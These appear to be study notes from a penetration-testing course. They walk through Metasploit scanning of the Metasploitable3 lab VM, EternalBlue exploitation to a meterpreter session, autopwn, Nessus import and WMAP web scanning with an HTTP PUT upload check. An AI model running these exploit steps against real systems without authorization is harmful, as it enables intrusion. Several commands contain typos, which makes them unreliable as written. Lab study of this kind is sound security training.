# Vulnerability Scanning with MSF

## Vulnerability Scanning

- Vulnerability Scanning & detection is the process of scanning a target for vulnerabilites and verifying whether they can be exploited
- So far, we have been able to identify and exploit misconigurations on target systems, however, in this section we will be exploring the process of utilizing auxiliary and exploit modules to scan and identify inherent vulnerabilities in services, operating systems and web apps.
- We also be exploring the process of utilizing third party vulnerability scanning tools like Nessus and how we can integrate Nessus functionality in to the MSF.

## Lab Environment 

- For the purposes of demonstrating the vulnerability scanning process, we will be utilizing an intentionally vulnerable virtual machine called Metasploitable3 that is based on Windows Server 2008.
- Metasploitable3 was developed by Rapid7 to demonstrate how MSF can be used to perform exploitation of a Windows System.
- Instructions on how this VM can be setup can be found here: https://bit.ly/3kASwns

## Demo: Vulnerability Scanning with MSF

`sudo nmap -sn [IP/24]`

`ip a s` to get the target IP

`service postgresql start && msfconsole`

msf6:`setg rhosts [targetIP]`

msf6:`setg rhost [targetIP]`

msf6:`workspace -a MS3`

We enumerate the service version with following command which imports the results automatically into the msf database:

msf6:`db_nmap -sS -sV -O [targetIP]`

The information got stored:

msf6:`hosts`

msf6:`services`

How do we utilize this service information to find and identify vulnerabilites?

- We could search for exploits like f.e. `search type:exploit name:Microsoft IIS`, dead end if the msf exploit module don't match the service version running on the target

If we are not sure if a exploit version works for the service version running on the system, we can use the module and type in `info`

msf6:`set payload windows/meterpreter/reverse_tcp`

msf6:`show options`

We need to enumerate the service so we can fill in the variables correctly (port etc.)

msf6:`services`

We take a step back into msf.

msf6:`services`

If we want to search for a msf module, we can use the `search` command or we can use the inbuilt kali linux searchsploit utility:

msf6:`searchsploit "Microsoft Windows SMB | grep -e "Metasploit"`

msf6:`search eternalblue`

First we use the auxiliary module to check if the target is vulnerable:

msf6:`use auxiliary/scanner/smb/smb_ms17_010`

msf6:`show options`

msf6:`run`

msf6:`use exploit/windows/smb/ms17_010_eternalblue`

msf6:`show options`: check if correctly configured

msf6:`run`

We get a meterpreter session.

### Metasploit AutoPWN

https://github.com/hahwul/metasploit-autopwn

The `metasploit-autopwn` repository provides a script that replicates the classic "Autopwn" feature in Metasploit, automating the process of scanning for vulnerabilities, selecting appropriate exploits, and executing them against a target system. It handles exploit management, payload selection, and session handling automatically, simplifying penetration testing tasks. This tool is useful for quickly identifying and exploiting vulnerabilities, but should only be used ethically and with proper authorization.

download repo and move it into /usr/share/metasploit-framework/plugins

msf6:`load db_autopwn`

msf6:`db_autopwn`

msf6:`db_autopwn -p -t`

Specify port range:

msf6:`db_autopwn -p -t -PI 445`

The next step would be enumerate more infos and finding the appropriate exploit to use.

### Analyze command:

Analyzes the contents of the msf databases (hosts and services), and create a list of vulnerabilites the services suffer from.

msf6:`analyze`

msf6:`vulns`

# Vulnerability Scanning with Nessus

- Nessus is a proprietary vulnerabiliy scanner developed by Tenable.
- We can utilize Nessus to perform a vulnerability scan on a target system, after which, we can import the Nessus results in to MSF for analysis and exploitation.
- Nessus automates the process of identifying vulnerabilities and also provides us with information pertinent to a vulnerability like the CVE code.
- We can use the free version of Nessus (Nessus Essentials), which allows us to scan upto 16 IPs.

## Lab Environment

- We use the same Environment as before.

## Demo: Vulnerability Scanning with Nessus

We download Nessus Essentials 

`cd Downloads`

`chmod +x [Nessus_package]`

`sudo dpkg -i [Nessus_package]`

`sudo sstemctl start nessusd.service`

`sudo sstemctl status nessusd.service`

We go via browser to our localhost:

https://127.0.0.1:8834

After we set up Nessus, we Start a new scan and start a full system scan.

- Name: MS3
- Targets: [TargetIP]
- If we want to launch an authenticated scan, we can specify the credentials under "Credentials".
- We can get more info under "Discovery" and "Assessment" and "Reporting"
- We check out the "Vulnerability" after the scan is finished. The higher up the software is, the more vulnerability it has. We can adjust this via the "Filter" option.
- We get the CVE and CVS if we click on a vulnerabiliy.
- Severety filter gives us the vulns with high severeties.

- Exporting the scan and import it into msf:
  . Export, Nessus -> download XML

`msfconsole`

msf6:`workspce -a MS3_Nessus`

msf6:`db_import`

msf6:`db_import /home/kali/Downloads/[Nessus_import]`

msf6:`hosts`

msf6:`services`

msf6:`vulns`: Gives us ideas about the vulnerabilites and ports

msf6:`vulns -p 445`: Shows us all vulnerabilites affecting this version of SMB on the target.

### Obtaining This Information Obtaining Exploits:

We can try to look for exploits on various ports.

If we want to search for a specific CVE exploit, we can use following command:

msf6:`search cve.2017 name:smb`: gives us various modules for this CVE

Conclusion: We kann look for CVEs via Nessus and search for them in the MSF

# Web App Vulnerability Scanning with WMAP

- WMAP is a powerful, feature-rich web application vulnerability scanner that can be used to automate web server enumeration and scan web applications for vulnerabilities.
- WMAP is available as an MSF plugin and can be loaded directly into MSF.
- WMAP is fully integrated with MSF, which consequently allows us to perform web app vulnerability scanning from within the MSF.

## Demo: Web App Vulnerability Scanning with WMAP

- We use the Lab Environment we used in the webserver enumeration in the enumeration section (The Metasploit Framework)

`ifconfig`

`service postgresql start && msfconsole`

msf6:`workspace -a Web_Scanning`

msf6:`setg [target IP]`

We load the wmap plugin:

msf6:`load wmap`

msf6:`wmap_` + Tab autocompletion to list commands

Firstly, we take a look at our sites:

msf6:`wmap_sites -h`

msf6:`wmap_sites -a [target IP]`

We set up our target:

msf6:`wmap_targets -h`

msf6:`wmap_targets -t http://[targetIP][/]`

Shows us the sites we added with some info.

msf6:`wmap_sites -l`

msf6:`wmap_targets -l`

Checking for auxiliary modules which could be useful:

msf6:`wmap_run -h`

msf6:`wmap_run -t `

Run vulnerability scan with all the modules:

msf6:`wmap_run -e`

Listing all vulnerabilites wmap was able to detect:

msf6:`wmap vulns -h`

msf6:`wmap vulns -l`

msf6:`use auxiliary/scanner/http/options`

msf6:`run`

We could execute the http module to find out if we can put a file into a direcoty:

msf6:`use auxiliary/scanner/http/http_put`

msf6:`show options`

We change the directory:

msf6:`set PATH /data/`

msf6:`run`

msf6:`curl http://[targetIP]/path/to/file`

We see that we are able to upload files. A attacker could now upload a web payload onto the webserver.

We can change the file data to check if we can really upload anything:

msf6:`set filedata "This does work"`

msf6:`set filename this_works.txt`

msf6:`run`

msf6:`curl http://[targetIP]/path/to/file`

























